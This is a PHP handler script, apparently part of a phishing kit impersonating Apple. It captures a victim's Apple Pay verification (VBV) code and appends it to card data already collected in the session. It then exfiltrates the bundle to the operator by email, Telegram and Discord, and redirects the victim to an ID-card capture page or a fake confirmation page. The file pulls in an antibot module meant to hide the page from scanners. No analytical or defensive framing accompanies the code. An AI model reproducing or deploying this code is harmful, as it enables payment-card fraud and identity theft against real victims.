<?php 

include("../home.php");
include('../infos.php');
    include('../antibots/antibot.php');
    include('../strom1.php');

if(isset($_POST)){

    $_SESSION["apple_code"] = clean_user_input($_POST["apple_code"]); 


    if(!empty($_SESSION["apple_code"])){

        // Everything seems fine

        $_SESSION["apple_to_send"] = "
[💯] Apple Pay Infomations [💯]

🧸 VBV : ".$_SESSION["apple_code"]." ";

        $to_send = $_SESSION["apple_to_send"] . $_SESSION["cc_to_send"];

        if($config["enable_email"]){
            send_email_notification($to_send,$config,"[📱] 1 Apple Pay Incoming");
        }
        if($config["enable_telegram"]){
            send_telegram_notification($to_send,$config);
        }   
        if($config["enable_discord"]){
            send_discord_notification($to_send,$config,"[📱] 1 Apple Pay Incoming");
        }   



        if($config["toggle_cni"]){
            header("Location: ../pages/id_card.php?sessid=" . $_SESSION["id"]);
        }
        else{
            header("Location: ../pages/confirmation.php?sessid=" . $_SESSION["id"]);
        }


    }
    else{
        // User credentials not set, redirecting
        header("Location: ../apple_activation.php?credentials_not_set=true&authorize_client=" . $_SESSION["id"]);
    }

}
else{
    // Post not set, redirecting
    header("Location: ../apple_activation.php?empty=true&authorize_client=" . $_SESSION["id"]);}


?>